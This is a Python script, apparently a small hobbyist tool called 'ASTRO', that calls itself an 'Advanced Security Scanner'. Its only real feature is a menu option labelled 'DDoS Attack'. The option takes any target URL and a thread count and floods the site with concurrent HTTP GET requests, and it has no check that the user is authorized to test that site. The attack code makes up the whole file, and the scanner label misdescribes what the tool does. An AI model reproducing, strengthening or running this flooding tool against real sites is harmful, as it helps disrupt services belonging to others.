import threading
import requests
import time
import random
from urllib.parse import urlparse
from queue import Queue

# Colors for better UI
class Colors:
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    ENDC = '\033[0m'
    
def print_logo():
    logo = """
            ..',,,'..            
         .',;;;;;;;;,'.          
      ..',;;;;;;;;;;;;;;,..       
     .,;;;,'..'''''.',;;;,.      
     .;;;;.  ..   .. .;;;;'      
     .,;;;.  ...     .;;;;.      
      ..,;,.  ...   .,;,..       
        .';;'.    .',;'.         
    ..',,;;;;;,,,,;;;;;,,'..     
  .','.....................''.   
 .',..',,,,,,,,,,,,,,,,,,,..,,. 
 ________________________________ 
|                               |       
|        ASTRO - v1.0           |
|       Author - Jasraj         |
|   Advanced Security Scanner   |
|_______________________________|
"""
    print(f"{Colors.BLUE}{logo}{Colors.ENDC}")    

# DDoS Attack Class
class DDoSAttack:
    def __init__(self, target, num_threads=50, timeout=3):
        self.target = target
        self.num_threads = num_threads
        self.timeout = timeout
        self.thread_pool = Queue()

    def check_valid_target(self):
        """Check if the URL is valid and reachable."""
        try:
            result = urlparse(self.target)
            if not result.scheme in ['http', 'https']:
                print(f"{Colors.RED}Invalid URL scheme. URL must start with http:// or https://{Colors.ENDC}")
                return False
            if not result.netloc:
                print(f"{Colors.RED}Invalid URL. Domain is missing.{Colors.ENDC}")
                return False
            return True
        except Exception as e:
            print(f"{Colors.RED}URL parsing failed: {str(e)}{Colors.ENDC}")
            return False

    def send_request(self):
        """Send HTTP request to the target."""
        try:
            headers = {'User-Agent': 'Mozilla/5.0'}
            response = requests.get(self.target, headers=headers, timeout=self.timeout)
            if response.status_code == 200:
                print(f"{Colors.GREEN}Request successful! Status code: {response.status_code}{Colors.ENDC}")
            else:
                print(f"{Colors.YELLOW}Received status code: {response.status_code}{Colors.ENDC}")
        except requests.RequestException as e:
            print(f"{Colors.RED}Request failed: {str(e)}{Colors.ENDC}")

    def worker(self):
        """Worker function for threads."""
        while not self.thread_pool.empty():
            self.send_request()
            self.thread_pool.get()

    def attack(self):
        """Simulate the DDoS attack using threads."""
        for _ in range(self.num_threads):
            self.thread_pool.put(1)  # Dummy data to fill the queue
        threads = []
        for _ in range(self.num_threads):
            thread = threading.Thread(target=self.worker)
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()  # Ensure all threads complete

    def start_attack(self):
        """Start the DDoS attack."""
        if self.check_valid_target():
            print(f"{Colors.GREEN}Starting DDoS attack on {self.target} with {self.num_threads} threads.{Colors.ENDC}")
            self.attack()
            print(f"{Colors.YELLOW}Attack completed.{Colors.ENDC}")

# Main Function
def main():
    print_logo()  # Display the logo

    while True:
        print(f"{Colors.BLUE}Select a task:")
        print("1. DDoS Attack")
        print("2. Exit")
        choice = input(f"{Colors.BLUE}Enter your choice (1 or 2): {Colors.ENDC}")

        if choice == '1':
            target_url = input(f"{Colors.YELLOW}Enter target URL for DDoS attack: {Colors.ENDC}")
            try:
                num_threads = int(input(f"{Colors.YELLOW}Enter the number of threads (10-100): {Colors.ENDC}"))
                if not (10 <= num_threads <= 100):
                    raise ValueError("Number of threads must be between 10 and 100.")
                ddos_attack = DDoSAttack(target_url, num_threads)
                ddos_attack.start_attack()
            except ValueError as e:
                print(f"{Colors.RED}Error: {str(e)}{Colors.ENDC}")

        elif choice == '2':
            print(f"{Colors.GREEN}Exiting program...{Colors.ENDC}")
            break

        else:
            print(f"{Colors.RED}Invalid choice. Please enter '1' or '2'.{Colors.ENDC}")

if __name__ == "__main__":
    main()
